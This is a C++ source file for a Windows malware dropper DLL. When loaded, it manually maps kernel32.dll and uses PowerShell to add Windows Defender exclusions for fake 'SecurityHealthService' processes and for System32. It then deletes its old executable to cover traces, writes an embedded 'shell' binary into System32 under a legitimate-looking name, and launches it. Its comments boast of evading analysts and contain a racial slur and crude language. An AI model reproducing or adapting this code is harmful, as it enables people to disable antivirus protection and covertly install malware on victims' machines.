// dllmain.cpp : Definisce il punto di ingresso per l'applicazione DLL.
#include "pch.h"
#include "general.h"
#include "embeds.h"

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

CHAR* ExePath() {
    CHAR buffer[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return buffer;
}
std::string GetCWD() {
    WCHAR buffer[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    std::wstring ws(buffer);
    std::string file_path(ws.begin(), ws.end());
    std::wstring::size_type pos = file_path.find_last_of("\\/");
    return file_path.substr(0, pos + 1);
}
void main() {
	//Alloc console for debug purposes
	//AllocConsole();
	//FILE* f;
	//freopen_s(&f, "CONOUT$", "w", stdout);

    //if (IsElevated()) {
    //    printf("Im elevated");
    //}
    //else {
    //    printf("Im a mid integrity dumbass");
    //    return;
    //}
    auto full_path = ExePath();

    SetConsoleTitle(full_path);

	HANDLE hProc = GetCurrentProcess();

	auto pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));

	while (!pKernel) {
		pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
	}

	//Uses manual mapped kernel32.dll to call CreateProcessA
	Powershell powershell((CreateProcessA_t)ResolveFunctionPtr(pKernel, L"CreateProcessA"));
	//Add exclusions for the Shell, Shell Manager and legitimate process (just to mess with anyone reversing this shit idk)   8================================================D
	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService.exe\"");
	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService32.exe\"");
	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthServiceManager.exe\"");
	//Add exclusion for C:\Windows\System32, which is where the service will be located, also just to mess with anyone reversing this bad boy
	powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\System32\"");

    while (FileExists(full_path)) { //If update.exe still exists, wait for it to be renamed
        Sleep(100);
    }

    while (!remove((GetCWD() + "trash.tmp").c_str())) { //Remove the old executable as fast as possible to avoid sussy bakas looking around the folder :)
        Sleep(100);
    }

	CloseHandle(hProc);

    //Write the shell inside System modules folder, just because why not mess with them niggas
    std::ofstream output;
    output.open(SHELL_PATH(SHELL_MODULE_NAME), std::ofstream::binary);
    output.write((char*)embedded_image_1, embedded_image_1_size);
    output.close();

    //Open the shell, which will then load the service
    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    while (!CreateProcessA(SHELL_PATH(SHELL_MODULE_NAME), (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
    {
        Sleep(100);
    }
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    //Wait for main executable to end execution otherwise it will fucking crash sometimes
	Sleep(-1);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)main, NULL, NULL, NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
